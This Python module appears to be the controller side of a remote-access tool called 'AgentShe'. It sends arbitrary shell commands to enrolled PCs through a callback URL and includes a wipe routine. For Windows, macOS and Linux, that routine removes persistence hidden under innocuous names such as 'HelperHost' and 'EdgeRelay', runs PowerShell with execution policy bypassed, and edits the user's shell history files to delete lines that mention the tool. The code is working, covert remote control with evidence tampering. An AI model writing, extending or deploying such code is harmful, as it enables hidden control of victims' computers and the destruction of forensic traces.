from __future__ import annotations

import logging
from typing import Any

import httpx

from app import store

log = logging.getLogger("agentshe.remote")


async def pc_health(session: dict[str, Any], timeout: float = 8.0) -> bool:
    url = (session.get("callback_url") or "").rstrip("/")
    token = session.get("token") or ""
    if not url or not token:
        return False
    try:
        async with httpx.AsyncClient(timeout=timeout) as client:
            r = await client.get(f"{url}/health", params={"token": token})
            if r.status_code == 200 and r.json().get("ok"):
                store.touch_session(session["id"])
                return True
    except Exception as e:
        log.debug("health %s: %s", session.get("name"), e)
    return False


async def pc_run(
    session: dict[str, Any],
    command: str,
    timeout: float = 120.0,
    *,
    record: bool = True,
) -> dict[str, Any]:
    url = (session.get("callback_url") or "").rstrip("/")
    token = session.get("token") or ""
    if not url or not token:
        raise RuntimeError("PC sans callback (réinstalle avec /connect)")
    async with httpx.AsyncClient(timeout=timeout) as client:
        r = await client.post(
            f"{url}/run",
            headers={"X-AgentShe-Token": token},
            json={"token": token, "command": command},
        )
        if r.status_code == 401:
            raise RuntimeError("Token PC invalide — /connect à nouveau")
        r.raise_for_status()
        data = r.json()
    if record:
        store.append_history(
            session["id"],
            command,
            str(data.get("output") or ""),
            int(data.get("exit_code") or 0),
        )
    return data


def _full_wipe_command(session: dict[str, Any]) -> str:
    """OS-specific wipe so even older agents erase all traces before exit."""
    platform = (session.get("platform") or "").lower()
    agent = session.get("agent") or {}
    if not platform or platform == "any":
        platform = (agent.get("platform") or "").lower()
    if platform in ("windows", "win"):
        # shell=True on Windows = cmd.exe → force PowerShell for wipe
        return (
            "powershell -NoProfile -ExecutionPolicy Bypass -Command \""
            "$ErrorActionPreference='SilentlyContinue'; "
            "schtasks /Delete /TN HelperHost /F; schtasks /Delete /TN AgentShePC /F; "
            "$rk='HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'; "
            "Remove-ItemProperty -Path $rk -Name HelperHost -EA SilentlyContinue; "
            "Remove-ItemProperty -Path $rk -Name AgentShePC -EA SilentlyContinue; "
            "taskkill /F /IM EdgeRelay.exe; "
            "$paths=@("
            "(Join-Path $env:LOCALAPPDATA 'HelperHost'),"
            "(Join-Path $env:LOCALAPPDATA 'AgentShe'),"
            "(Join-Path $env:TEMP 'HelperHostCache'),"
            "(Join-Path $env:USERPROFILE '.agentshe')"
            "); "
            "foreach($p in $paths){ if(Test-Path $p){ Remove-Item -LiteralPath $p -Recurse -Force } }; "
            "$hist=Join-Path $env:APPDATA 'Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt'; "
            "if(Test-Path $hist){ "
            "(Get-Content $hist) | Where-Object { $_ -notmatch 'HelperHost|EdgeRelay|agentshe|bootstrap' } "
            "| Set-Content $hist -Encoding UTF8 }; "
            "Write-Output wiped"
            "\""
        )
    # mac / linux
    return (
        "set +e; "
        "launchctl bootout gui/$(id -u) \"$HOME/Library/LaunchAgents/com.helperhost.agent.plist\" 2>/dev/null; "
        "launchctl unload \"$HOME/Library/LaunchAgents/com.helperhost.agent.plist\" 2>/dev/null; "
        "rm -f \"$HOME/Library/LaunchAgents/com.helperhost.agent.plist\" "
        "\"$HOME/Library/LaunchAgents/fr.agentshe.pc.plist\"; "
        "systemctl --user disable --now helperhost.service agentshe.service 2>/dev/null; "
        "rm -f \"$HOME/.config/systemd/user/helperhost.service\" \"$HOME/.config/systemd/user/agentshe.service\"; "
        "pkill -f EdgeRelay 2>/dev/null; "
        "rm -rf \"$HOME/Library/Application Support/HelperHost\" "
        "\"$HOME/.local/share/HelperHost\" \"$HOME/.agentshe\" "
        "/tmp/HelperHostCache \"$TMPDIR/HelperHostCache\"; "
        "for h in \"$HOME/.bash_history\" \"$HOME/.zsh_history\"; do "
        "[ -f \"$h\" ] && grep -viE 'HelperHost|EdgeRelay|agentshe|bootstrap' \"$h\" > \"$h.tmp\" "
        "&& mv \"$h.tmp\" \"$h\"; done; "
        "echo wiped"
    )


async def pc_shutdown(session: dict[str, Any], timeout: float = 25.0) -> bool:
    """Ask PC to erase all local traces (binaries, cache, logs, autostart, shell history)."""
    url = (session.get("callback_url") or "").rstrip("/")
    token = session.get("token") or ""
    if not url or not token:
        return False
    try:
        # Pre-wipe via /run so older installed agents also purge TEMP cache + history
        try:
            await pc_run(session, _full_wipe_command(session), timeout=60.0, record=False)
        except Exception as e:
            log.warning("pre-wipe %s: %s", session.get("name"), e)
        async with httpx.AsyncClient(timeout=timeout) as client:
            r = await client.post(
                f"{url}/shutdown",
                headers={"X-AgentShe-Token": token},
                json={"token": token, "wipe": True},
            )
            return r.status_code == 200
    except Exception as e:
        log.warning("shutdown %s: %s", session.get("name"), e)
        return False
